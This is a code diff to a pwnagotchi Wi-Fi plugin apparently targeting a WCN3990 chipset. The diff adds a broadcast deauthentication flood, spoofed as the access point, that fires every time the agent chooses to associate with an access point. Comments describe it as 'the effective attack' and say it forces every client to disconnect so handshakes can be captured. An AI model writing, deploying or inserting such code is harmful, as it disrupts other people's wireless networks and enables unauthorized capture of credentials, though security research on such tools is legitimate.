@@ -186,13 +186,26 @@ class RhodepInternalInject(plugins.Plugin):
             pass
 
     def _patched_associate(self, ap, throttle=0):
+        # WCN3990 constraint: the firmware only delivers *management* frames to
+        # the monitor (patch 0117), never data/QoS. bettercap therefore never
+        # correlates client→AP (that correlation needs data frames), so its
+        # station list stays empty and pwnagotchi's agent.deauth() is never
+        # called. To still be useful, when pwnagotchi decides an AP is worth
+        # associating to, we ALSO fire a broadcast deauth against that BSSID.
+        # A broadcast deauth (DA=ff:ff:ff:ff:ff:ff, SA spoofed to = BSSID by
+        # patch 0118) forces every client on that AP to disconnect and reconnect
+        # — exactly the effect pwnagotchi wants without needing to know clients.
         ap_mac = self._mac_of(ap)
         ch = self._channel_of(ap)
         if not ap_mac:
             return
         with self._lock:
-            self._run_inject("assoc", ap_mac, None, ch, count=5)
+            # a real (probe-req) assoc-emulation stub, cheap
+            self._run_inject("assoc", ap_mac, None, ch, count=3)
+            # the effective attack: broadcast deauth against this AP
+            self._run_inject("deauth", ap_mac, None, ch, count=20)
         try:
             plugins.on("association", self._agent, ap)
+            plugins.on("deauthentication", self._agent, ap, None)
         except Exception:
             pass
